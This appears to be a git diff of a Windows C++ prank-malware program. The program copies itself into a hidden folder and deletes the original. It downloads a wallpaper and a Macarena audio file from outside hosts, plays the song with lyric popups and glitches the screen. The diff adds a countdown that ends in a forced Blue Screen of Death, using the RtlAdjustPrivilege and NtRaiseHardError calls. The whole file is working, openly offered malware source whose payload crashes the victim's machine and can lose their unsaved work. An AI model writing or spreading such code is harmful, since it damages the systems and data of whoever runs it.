@@ -18,25 +18,12 @@
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "winmm")
+#pragma comment(lib, "ntdll.lib");
 
 #define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
 
-void DelMe()
-{
-    TCHAR szModuleName[MAX_PATH];
-    TCHAR szCmd[2 * MAX_PATH];
-    STARTUPINFO si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-
-    GetModuleFileName(NULL, szModuleName, MAX_PATH);
-
-    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
-
-    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-}
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
 
 /*
      Wallpaper -> 303791
@@ -122,18 +109,18 @@ namespace Payloads {
 
     BOOL screen_bug = 0;
     void SCREEN_BUG() {
-        while (TRUE) {
+        int inc = 0;
+        int sw = GetSystemMetrics(SM_CXSCREEN);
+        int sh = GetSystemMetrics(SM_CYSCREEN);
+        while (1) {
             if (screen_bug) {
-                HDC dcDesktop = GetWindowDC(NULL);
-                int scrX = GetSystemMetrics(SM_CXSCREEN);
-                int scrY = GetSystemMetrics(SM_CYSCREEN);
-                srand(GetTickCount());
-                int x = rand() % scrX;
-                for (;;)
-                    if (screen_bug)
-                        for (int y = scrY; y > 0; y--)
-                            SetPixel(dcDesktop, x, y, GetPixel(dcDesktop, x, y - 3));
-                Sleep(1);
+                inc++;
+                int x = rand() % (sw - 0);
+                int w = rand() % (5 - 0);
+                int y = inc;
+                HDC hdc = GetDC(HWND_DESKTOP);
+                BitBlt(hdc, x, y, w, sw, hdc, x, 0, SRCCOPY);
+                Sleep(100);
             }
         }
     }
@@ -154,8 +141,8 @@ std::wstring s2ws(const std::string& s)
     return r;
 }
 
-std::string wallpaper = "C:\\Windows\\Calbus\\mauriescalboxdddddddCALBISIE.png";
-std::string soundThing = "C:\\Windows\\Calbus\\yathusableeeemfskfmdsl.wav";
+std::string wallpaper = "C:\\Calbus\\mauriescalboxdddddddCALBISIE.png";
+std::string soundThing = "C:\\Calbus\\yathusableeeemfskfmdsl.wav";
 
 BOOL isMacarenaPlaying = 0;
 std::vector<std::thread> coroutine;
@@ -185,23 +172,23 @@ namespace Lyrics {
             songLyrics[x0] = x1;
     }
     void doLyric(int x0) {
-        
-        if (doesLyricsExists(x0-1)) {
-            lyric = songLyrics[x0-1];
-            lyricsBox(songLyrics[x0-1]);
+
+        if (doesLyricsExists(x0 - 1)) {
+            lyric = songLyrics[x0 - 1];
+            lyricsBox(songLyrics[x0 - 1]);
         }
     }
     void initLyrics() {
-        addLyric(370,"When I dance they call me Macarena");
-        addLyric(395,"And the boys they say me que estoy buena");
-        addLyric(420,"They all want me, they can't have me");
-        addLyric(442,"So they all come and dance beside me");
-        addLyric(469,"Move with me, chant with me");
-        addLyric(490,"And if you're good I'll take you home with me");
-        addLyric(509,"Dale a tu cuerpo alegría Macarena");
-        addLyric(530,"Que tu cuerpo es pa' darle alegria y cosa buena");
-        addLyric(560,"Dale a tu cuerpo alegría Macarena");
-        addLyric(580,"Heee");
+        addLyric(370, "When I dance they call me Macarena");
+        addLyric(395, "And the boys they say me que estoy buena");
+        addLyric(420, "They all want me, they can't have me");
+        addLyric(442, "So they all come and dance beside me");
+        addLyric(469, "Move with me, chant with me");
+        addLyric(490, "And if you're good I'll take you home with me");
+        addLyric(509, "Dale a tu cuerpo alegría Macarena");
+        addLyric(530, "Que tu cuerpo es pa' darle alegria y cosa buena");
+        addLyric(560, "Dale a tu cuerpo alegría Macarena");
+        addLyric(580, "Heee");
         addLyric(583, "Heee");
         addLyric(584, "Heee");
         addLyric(585, "Heee");
@@ -261,10 +248,10 @@ int main(int argc, char* argv[], char* envp[])
     Lyrics::initLyrics();
     std::thread currentThread;
     FreeConsole();
-    system("md C:\\Windows\\Calbus");
-    if (executable_name() != "C:\\Windows\\Calbus\\executable_xd.exe") {
-        CopyFileA(executable_name().c_str(),"C:\\Windows\\Calbus\\executable_xd.exe",0);
-        std::string sysDel = "C:\\Windows\\Calbus\\executable_xd.exe yes \"" + executable_name() + "\"";
+    system("md C:\\Calbus");
+    if (executable_name() != "C:\\Calbus\\executable_xd.exe") {
+        CopyFileA(executable_name().c_str(), "C:\\Calbus\\executable_xd.exe", 0);
+        std::string sysDel = "C:\\Calbus\\executable_xd.exe yes \"" + executable_name() + "\"";
         STARTUPINFO si = { 0 };
         PROCESS_INFORMATION pi = { 0 };
         std::wstring lvi = s2ws(sysDel);
@@ -275,16 +262,16 @@ int main(int argc, char* argv[], char* envp[])
     }
     if (argc != 3)
         return 0;
-    if (!strstr(argv[1],"yes"))
+    if (!strstr(argv[1], "yes"))
         return 0;
-    DeleteFileA(argv[2]);
+    while (!DeleteFileA(argv[2])) Sleep(20);
     /* Download required files for running. */
     LPCSTR wpDlWebsite = "https://i.imgur.com/EFRtiJK.png";
     if (!fileUtils::file_check(wallpaper, 303791)) {
         Sleep(50);
         URLDownloadToFileA(NULL, wpDlWebsite, wallpaper.c_str(), 0, NULL);
     }
-    wpDlWebsite = "https://download947.mediafire.com/0ty3stzmvpcg/nfbz2ppyoqklqz6/macarena-1996-high-quality-audio.wav";
+    wpDlWebsite = "https://dpointhostingsv1.000webhostapp.com/yathusableeeemfskfmdsl.wav";
     if (!fileUtils::file_check(soundThing, 40739508)) {
         Sleep(50);
         URLDownloadToFileA(NULL, wpDlWebsite, soundThing.c_str(), 0, NULL);
@@ -293,12 +280,28 @@ int main(int argc, char* argv[], char* envp[])
     currentThread = std::thread(playMacarena);
     SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, std::toLPWSTR(wallpaper), SPIF_UPDATEINIFILE);
 
-    while (playMacarena) {
+    while (isMacarenaPlaying) {
         Lyrics::doLyric(uKnow);
-        const char * uKnowChar = std::to_string(uKnow).c_str();
+        const char* uKnowChar = std::to_string(uKnow).c_str();
         Payloads::screen_bug = 1;
         uKnow++;
         Sleep(100);
     }
+    Sleep(1000);
+    Lyrics::lyricsBox("5");
+    Sleep(1000);
+    Lyrics::lyricsBox("4");
+    Sleep(1000);
+    Lyrics::lyricsBox("3");
+    Sleep(1000);
+    Lyrics::lyricsBox("2");
+    Sleep(1000);
+    Lyrics::lyricsBox("1");
+    Sleep(1000);
+    /* BSOD */
+    BOOLEAN bl = NULL;
+    ULONG response;
+    RtlAdjustPrivilege(19, 1, 0, &bl);
+    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
     return 0;
 }
